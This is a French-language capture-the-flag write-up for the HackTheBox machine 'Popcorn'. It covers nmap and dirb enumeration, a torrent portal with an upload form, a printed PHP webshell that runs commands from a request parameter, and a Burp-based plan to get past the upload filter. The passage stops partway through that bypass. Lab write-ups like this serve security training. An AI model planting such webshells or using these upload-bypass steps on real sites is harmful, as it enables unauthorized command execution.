---
description: >-
  Popcorn Machine Linux de difficulté Medium disponible sur
  https://hackthebox.eu.
---

# HTB - Popcorn - Linux

Présentation

![Informations g&#xE9;n&#xE9;rales](../../.gitbook/assets/popcorn.png)

## Enumération

### Scan Nmap

```text
┌─[root@kali]─[~]
└──╼ #nmap -sC -sT -sV 10.10.10.6
```

| Options | Description |
| :--- | :--- |
| -sC |  |
| -sT |  |
| -sV |  |

```text
┌─[root@kali]─[~]
└──╼ #nmap -sC -sT -sV 10.10.10.6
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-03 18:07 CET
Nmap scan report for 10.10.10.6
Host is up (0.081s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.95 seconds
```

| Ports Ouverts | Description |
| :--- | :--- |
| 22 | SSH -  |
| 80 | HTTP |

Si le port 443 était ouvert j'aurais pus le scanner avec la commande :

```text
nmap --script ssl-enum-ciphers -p 443 10.10.10.6
```

| Options | Description |
| :--- | :--- |
| --script ssl-enum-ciphers |  |
| -p 443 |  |

Cela nous aurait donnée des informations sur les versions de **TLS** utilisée par la cible et sur les suite de chiffrement. TLSv1.0 serait noté comme faible, tout comme les suite de chiffrement non sécurisée.

Première chose à faire, on ouvre Firefox et on accède à l'url [http://10.10.10.6/](http://10.10.10.6/) pour voire ce qu'il s'y affiche :

## User Flag

### Website - TCP 80

![Page web par d&#xE9;faut](../../.gitbook/assets/popcorn_2.png)

Il s'agit d'une ancienne page par défaut. Nous n'avons nulle part ailleurs pour rechercher du contenu. Nous allons donc faire une analyse des répertoire pour énumérer  les fichier et dossiers cachés sur la cible. Pour cela nous allons utilisé **dirb :**

```text
┌─[root@kali]─[~]
└──╼ #dirb http://10.10.10.6/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sun Jan  3 18:50:27 2021
URL_BASE: http://10.10.10.6/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.6/ ----
+ http://10.10.10.6/cgi-bin/ (CODE:403|SIZE:286)
+ http://10.10.10.6/index (CODE:200|SIZE:177)
+ http://10.10.10.6/index.html (CODE:200|SIZE:177)
+ http://10.10.10.6/server-status (CODE:403|SIZE:291)
+ http://10.10.10.6/test (CODE:200|SIZE:47330)
==> DIRECTORY: http://10.10.10.6/torrent/

---- Entering directory: http://10.10.10.6/torrent/ ----
==> DIRECTORY: http://10.10.10.6/torrent/admin/
+ http://10.10.10.6/torrent/browse (CODE:200|SIZE:9278)
+ http://10.10.10.6/torrent/comment (CODE:200|SIZE:936)
+ http://10.10.10.6/torrent/config (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.10.6/torrent/css/
==> DIRECTORY: http://10.10.10.6/torrent/database/
+ http://10.10.10.6/torrent/download (CODE:200|SIZE:0)
+ http://10.10.10.6/torrent/edit (CODE:200|SIZE:0)
==> DIRECTORY: http://10.10.10.6/torrent/health/
+ http://10.10.10.6/torrent/hide (CODE:200|SIZE:3765)
==> DIRECTORY: http://10.10.10.6/torrent/images/
+ http://10.10.10.6/torrent/index (CODE:200|SIZE:11356)
+ http://10.10.10.6/torrent/index.php (CODE:200|SIZE:11356)
==> DIRECTORY: http://10.10.10.6/torrent/js/
==> DIRECTORY: http://10.10.10.6/torrent/lib/
+ http://10.10.10.6/torrent/login (CODE:200|SIZE:8371)
+ http://10.10.10.6/torrent/logout (CODE:200|SIZE:182)
+ http://10.10.10.6/torrent/preview (CODE:200|SIZE:28104)
```

**Le dossier torrent semble contenir un portail pour le partage de torrent :**

![](../../.gitbook/assets/popcorn_3.png)

On parcours le site pour voir ce qu'il peut s'y trouver. On recherche le plus souvent des fonctionnalité d'upload ou des champs de saisie comme des formulaire  
Il existe une page d'upload, mais elle redirige simplement vers le formulaire de connexion. Il existe une page Parcourir, et elle affiche actuellement un torrent:

![](../../.gitbook/assets/popcorn_4.png)

Je me suis donc ensuite crée un compte : 

![Inscription](../../.gitbook/assets/popcorn_5.png)

Je me suis donc logger avec mes identifiants et je peux accéder au formulaire d'upload.

![](../../.gitbook/assets/popcorn_8.png)

On peut dans un premier temps uploader un **webshell PHP** mis il y a un erreur :

```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>
```

![](../../.gitbook/assets/popcorn_9.png)

On peut tester d'upload un fichier torrent \(vous pouvez en récupérer un [ici](https://ubuntu.com/download/alternative-downloads)\) pour voir ce qui se produit. Une fois upload il nous renvoi sur la page du torrent. On peut cliquer sur "**Edit this torrent**" et un pop-up apparait avec un formulaire :

![](../../.gitbook/assets/popcorn_10.png)

On peut voir qu'on peut upload une image. Une fois qu'on upload une image on obtient les informations suivante : 

![](../../.gitbook/assets/popcorn_11.png)

En regardant la page torrent, je vois maintenant l'image téléchargée. En regardant le HTML, l'image est référencée par l'URL suivante:

```bash
http://10.10.10.6/torrent/thumbnail.php?gd=2&src=./upload/8b851cd45092b458da23ba0ed834906d79f4e2d7.jpg&maxw=96
```

Je pensais que cela pouvait être un **LFI**, mais il inclut le fichier référencé en tant qu'image, donc même si je peux passer en dehors du répertoire actuel, cela n'aide pas vraiment.  
Étant donné que le **`src`** ressemble à un chemin, j'ai vérifié [http://10.10.10.6/torrent/upload/](http://10.10.10.6/torrent/upload/), et il a renvoyé une liste de répertoires comprenant mon image téléchargée:

![](../../.gitbook/assets/popcorn_12.png)

### Shell en tant que www-data

Il y a deux possibilités de télécharger des fichiers ici, le torrent et l'image. J'ai commencé avec l'image, si je soumets un simple webshell php, il renvoie «Fichier invalide». Il y a un filtrage que je devrai contourner

Je vais trouver le téléchargement autorisé d'un PNG dans **Burp** et l'envoyer à **Repeater**. Un site Web vérifie les types de fichiers valides de trois manières courantes en les comparant à une liste d'autorisation ou de refus:

* Extension de fichier
* En-tête `Content-Type`
* [Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)

Je vais commencer par en changer un à la fois pour voir si le site se bloque. Tout d'abord, je vais changer l'extension en `.php`. Cela ne semble pas déranger:

